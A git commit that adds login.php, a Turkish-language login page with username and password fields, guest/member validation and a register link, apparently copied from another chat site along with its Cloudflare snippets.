e258e6ad222bb9215062cd2d97a961b089a02878
abdulrahmanzakrya1234 <154765504+abdulrahmanzakrya1234@users.noreply.github.com>
2023-12-24 15:22:19 -0800

    Add files via upload

---
+++ login.php
@@ -0,0 +1,111 @@
+
+
+<html>
+<head>
+<title></title>
+<meta http-equiv="X-UA-Compatible" content="IE=7"/>
+<meta http-equiv="Content-Type" content="text/html; charset="/>
+<script type="text/javascript">
+//<![CDATA[
+window.__CF=window.__CF||{};window.__CF.AJS={"vig_key":{"sid":"ef1dd5fea2b67d12bdc1e1249e271457"}};
+//]]>
+</script>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) { var CloudFlare=[{verbose:0,p:1374250054,byc:0,owlid:"cf",mirage:{responsive:0,lazy:0},mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/abv=2706741234/"},atok:"d4d840c4886575725474d5ebe3d7100a",zone:"populerity.com",rocket:"0",apps:{"vig_key":{"sid":"ef1dd5fea2b67d12bdc1e1249e271457"}}}];CloudFlare.push({"apps":{"ape":"2a0634e85942a4fa1c19686b19e29b35"}});var a=document.createElement("script"),b=document.getElementsByTagName("script")[0];a.async=!0;a.src="//ajax.cloudflare.com/cdn-cgi/nexp/abv=3609848800/cloudflare.min.js";b.parentNode.insertBefore(a,b);}}catch(e){};
+//]]>
+</script>
+<link type="text/css" rel="stylesheet" href="templates/style.css">
+<script language="javascript" type="text/javascript">
+<!--
+
+
+
+<!--
+	if(window.location == top.location){
+		window.location.href="index.html";
+	}
+
+	function getPass(){
+		document.location.href="index.php?do=password";
+	}
+
+	function _showPassword(){
+		document.getElementById('showGender').style.visibility="hidden";
+		document.getElementById('showPassword').style.visibility="visible";
+
+	}
+
+	function _showGender(){
+		document.getElementById('showGender').style.visibility="visible";
+		document.getElementById('showPassword').style.visibility="hidden";
+		document.getElementById('nickPass').value="";
+
+	}
+
+	function formCheckLogin(form){
+	var isim=document.getElementById('nickPass').value;
+	if (isim==""){alert('Sifreni girmedin'); return false;}
+		
+		if(!document.getElementById('guest_login').checked && !document.getElementById('member_login').checked) {
+  			alert("Please select 'Guest Login' or 'Member Login'");
+			return false;
+		}
+	}
+	// -->
+
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+//-->
+</script>
+<style type="text/css">
+<!--
+.style1 {color: #000000}
+.style2 {
+	color: #924406;
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+}
+-->
+</style>
+</head>
+<body leftmargin="0" topmargin="0" rightmargin="0" bottommargin="0" marginwidth="0" marginheight="0" class="body">
+<script type="text/javascript"><!-- 
+window.onload=function(){document.getElementById("yukleniy").style.display="none";} //--> 
+</script><!DOCTYPE HTML><style type="text/css">div.hbne{opacity:0.9;filter:alpha(opacity=90);position:fixed;z-index:4000;}div.hghd{top:0px;left:0px;}div.hbne{_position:absolute;}div.hghd{_bottom:auto;_top:expression(ie6=(document.documentElement.scrollTop+document.documentElement.clientHeight - 52+"px") );}</style>
+<div id="loginscreen" class="loginscreen" style="background-image: url('http://readlika.t.gp/templates/login/background.jpg');">
+
+		<form onSubmit="return formCheckLogin(this)" action="index.php" method="post">
+
+			<div id="infobox" class="infobox">
+
+				<table class="mediumtext">
+									<tr><td colspan="3">&nbsp;</td></tr>
+			  </table>
+
+				
+
+				<table class="mediumtext">
+				<tr><td width="112"><span class="style1">Kullanici Adi:</span></td>
+				<td><input class="input" type="text" name="nickName" maxlength="16"></td></tr>
+				</table>
+
+				<table class="mediumtext">
+
+			
+
+				
+				<tr id="showPassword" style="visibility:visible;"><td width="112"><span class="style1">Sifre:</span></td><td colspan="2"><span class="style1">
+			    <input class="input" id="nickPass" type="password" name="nickPass" maxlength="16">
+				</span></td>
+				</tr>
+				<tr><td colspan="3" nowrap><center>
+			        <img src="http://readlika.t.gp/img/giris1.png" width="173" height="49">
+		          <title></title>
+<p><span class="style2"><a href="index.php?do=register">Kay&#305;t Ol </a></span></p>
+</body>
+</html>&nbsp; </p>
+				</body>
+</html>
